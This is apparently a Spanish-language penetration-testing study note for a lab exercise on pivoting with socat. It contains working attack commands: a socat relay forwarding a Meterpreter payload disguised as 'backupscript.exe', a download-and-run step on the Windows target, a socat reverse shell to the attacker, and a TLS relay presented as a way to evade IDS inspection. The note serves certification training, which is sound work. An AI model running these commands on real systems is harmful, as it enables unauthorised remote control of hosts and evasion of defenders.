
## 🧠 Concepto clave

`socat` es una herramienta de relay bidireccional que crea un puente entre dos canales de red independientes. A diferencia de SSH tunneling, **no requiere autenticación ni establecer una sesión SSH** — simplemente escucha en un puerto y reenvía todo el tráfico que recibe hacia otro host y puerto. En pivoting actúa como **redirector puro**: el payload del objetivo apunta al pivot host (socat), socat lo reenvía transparentemente al atacante.

| Herramienta | Requiere | Uso en pivoting |
|---|---|---|
| `ssh -R` | Credenciales SSH + servidor SSH activo | Reverse port forwarding con cifrado |
| `Meterpreter portfwd` | Sesión Meterpreter activa | Port forwarding integrado en MSF |
| **`socat`** | **Solo el binario en el pivot** | **Redirector TCP puro sin dependencias** |

La ventaja de socat frente a SSH es su simplicidad operacional: un solo comando en el pivot es suficiente para establecer el redirector. No necesita credenciales, no necesita que el SSH server esté configurado correctamente, y funciona como relay transparente para cualquier protocolo TCP.

> [!info] **socat (SOcket CAT)** 📄 [socat — Linux man page](https://linux.die.net/man/1/socat)
> Herramienta Unix para crear conexiones bidireccionales entre dos flujos de datos. Cada flujo puede ser un socket TCP/UDP, un archivo, una pipe, un proceso, o prácticamente cualquier descriptor de E/S. En pivoting se usa como **redirector TCP**: escucha conexiones entrantes en un puerto y las reenvía a otro host/puerto. El flag `fork` es crítico — permite manejar múltiples conexiones simultáneas creando un proceso hijo por cada conexión entrante. Sin `fork`, socat solo acepta una conexión y termina.

---

## 📌 Escenario
```
[Windows 172.16.5.19]
    │  payload apunta a 172.16.5.129:8080
    ▼
[Ubuntu pivot 172.16.5.129 / 10.129.202.64]
    │  socat escucha :8080 → reenvía a 10.10.14.18:80
    ▼
[Atacante 10.10.14.18]
    │  MSF handler escucha :80
    ▼
[Sesión Meterpreter]
```

El Windows solo ve al Ubuntu. El Ubuntu actúa como relay invisible. El atacante recibe la sesión como si viniera del Ubuntu (`10.129.202.64`).

---

## 📌 Paso 1 — Iniciar socat como redirector en el pivot host

> [!tip] Lanzar el redirector socat en el Ubuntu pivot
> ```bash
> # En el Ubuntu pivot (172.16.5.129)
> socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
> ```
> `TCP4-LISTEN:8080` — Escuchar conexiones TCP IPv4 entrantes en el puerto `8080`. Este es el puerto al que apuntará el payload del Windows.
> `fork` — **Crítico**: crea un proceso hijo por cada conexión entrante, permitiendo múltiples conexiones simultáneas. Sin `fork`, socat termina tras la primera conexión.
> `TCP4:10.10.14.18:80` — Destino al que reenviar todo el tráfico recibido: IP del atacante, puerto `80` donde escucha el handler de MSF.

> [!important] `socat` en modo `TCP4-LISTEN` es bloqueante — ocupa el terminal mientras está activo. Para lanzarlo en background sin perder el control del terminal: `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 &`. El `&` lo envía al background. Para terminarlo después: `kill %1` o `pkill socat`.

---

## 📌 Paso 2 — Generar el payload apuntando al pivot

> [!tip] Crear payload Meterpreter HTTPS para Windows apuntando al socat del pivot
> ```bash
> msfvenom -p windows/x64/meterpreter/reverse_https \
>     LHOST=172.16.5.129 \
>     LPORT=8080 \
>     -f exe \
>     -o backupscript.exe
> ```
> `-p windows/x64/meterpreter/reverse_https` — Payload Meterpreter de 64 bits con transporte HTTPS — tráfico cifrado en TLS, difícil de inspeccionar por IDS.
> `LHOST=172.16.5.129` — IP del **pivot host** en la red interna — la única IP que el Windows puede alcanzar. **No** la IP del atacante.
> `LPORT=8080` — Puerto donde socat está escuchando en el pivot.
> `-f exe` — Formato ejecutable Windows PE.
> `-o backupscript.exe` — Nombre del output.

---

## 📌 Paso 3 — Configurar el listener en Metasploit

> [!tip] Configurar multi/handler en el atacante para recibir la sesión
> ```bash
> msfconsole -q
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_https
> set LHOST 0.0.0.0
> set LPORT 80
> run
> ```
> `set LHOST 0.0.0.0` — Escuchar en todas las interfaces. La conexión llegará desde `10.129.202.64` (el Ubuntu/socat), no directamente del Windows.
> `set LPORT 80` — Puerto donde socat reenvía el tráfico. Debe coincidir con el segundo argumento del comando socat (`TCP4:10.10.14.18:80`).

> [!important] El puerto `80` del listener puede requerir `sudo msfconsole` — en Linux los puertos por debajo del 1024 requieren privilegios de root. Alternativa: usar un puerto alto como `8000` o `4443` y ajustar el comando socat en consecuencia: `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:8000`.

---

## 📌 Paso 4 — Transferir y ejecutar el payload en el Windows

El payload se transfiere al Windows usando cualquiera de los métodos vistos anteriormente — servidor HTTP con Python desde el Ubuntu, SMB, o RDP clipboard si está habilitado:
```bash
# Desde el Ubuntu pivot — servidor HTTP para que el Windows descargue el payload
python3 -m http.server 8123

# En el Windows
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
C:\backupscript.exe
```

Al ejecutarse el payload, el flujo es:
```
Windows ejecuta backupscript.exe
    → conecta a 172.16.5.129:8080 (socat)
    → socat reenvía a 10.10.14.18:80 (MSF handler)
    → MSF recibe desde 10.129.202.64 (el pivot, no el Windows)
    → sesión Meterpreter establecida
```

La sesión se abre mostrando la conexión desde el Ubuntu:
```
[*] https://0.0.0.0:80 handling request from 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1)

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

---

## 📌 Otros usos de socat en pivoting

> [!tip] socat como redirector TCP genérico para cualquier servicio
> ```bash
> # Redirigir SMB (445) del pivot hacia un host interno
> socat TCP4-LISTEN:445,fork TCP4:172.16.5.19:445 &
>
> # Redirigir RDP (3389) del pivot hacia el DC interno
> socat TCP4-LISTEN:3389,fork TCP4:172.16.5.19:3389 &
>
> # Verificar que socat está escuchando
> ss -tulnp | grep socat
> netstat -antp | grep socat
> ```
> Con estos redirectores activos, conectarse a `10.129.202.64:3389` desde el atacante es equivalente a conectarse directamente a `172.16.5.19:3389` — socat hace la traducción transparentemente.

> [!tip] socat para crear una shell inversa simple (sin Meterpreter)
> ```bash
> # En el atacante — listener socat
> socat TCP4-LISTEN:4444,fork STDOUT
>
> # En el pivot o en el objetivo — conectar de vuelta
> socat TCP4:10.10.14.18:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
> ```
> `EXEC:/bin/bash` — Ejecuta bash y conecta sus streams al socket TCP.
> `pty` — Asigna una pseudo-terminal — da una shell completamente interactiva con soporte de control de jobs.
> `stderr` — Redirige stderr al socket también.
> `setsid` — Crea una nueva sesión de proceso.
> `sane` — Normaliza la configuración del terminal.

> [!tip] socat con cifrado TLS — versión sigilosa del redirector
> ```bash
> # Generar certificado autofirmado en el pivot
> openssl req -newkey rsa:2048 -nodes -keyout socat.key -x509 -days 1000 -out socat.crt
> cat socat.key socat.crt > socat.pem
>
> # Redirector TLS en el pivot
> socat OPENSSL-LISTEN:8080,cert=socat.pem,verify=0,fork TCP4:10.10.14.18:80
> ```
> `OPENSSL-LISTEN` — Escucha conexiones TLS en lugar de TCP plano. El tráfico entre el objetivo y el pivot viaja cifrado, dificultando la inspección por IDS/IPS en la red interna.

---

## 📌 Comparativa — socat vs SSH -R vs Meterpreter portfwd

| Criterio | socat | ssh -R | Meterpreter portfwd |
|---|---|---|---|
| Dependencias en el pivot | Solo binario `socat` | Servidor SSH activo + credenciales | Sesión Meterpreter activa |
| Cifrado del tráfico del relay | No (TCP plano) / Sí (con OPENSSL) | Sí (SSH) | Sí (Meterpreter cifra) |
| Múltiples conexiones simultáneas | Sí (con `fork`) | Sí | Sí |
| Facilidad de uso | Alta — un solo comando | Media — requiere SSH configurado | Alta — integrado en MSF |
| Requiere credenciales SSH | No | Sí | No |
| Detectable por blue team | Proceso `socat` en el pivot | Conexión SSH saliente del pivot | Proceso del payload en el pivot |

---

## 🔗 Relaciones / Contexto

socat es la herramienta de redirector más flexible del toolkit de pivoting porque su única dependencia es el propio binario — que frecuentemente ya está instalado en distribuciones Linux de servidor, o puede transferirse fácilmente como un binario estático. En el contexto del eCPPT, socat cubre el escenario donde el pivot host no tiene SSH accesible o no se tienen credenciales SSH, pero sí se puede ejecutar código en él. La combinación `socat TCP4-LISTEN:PUERTO,fork TCP4:ATACANTE:PUERTO` es un patrón que hay que tener completamente interiorizado — es la forma más rápida de establecer un redirector en un pivot host Linux con una sola línea sin configuración adicional.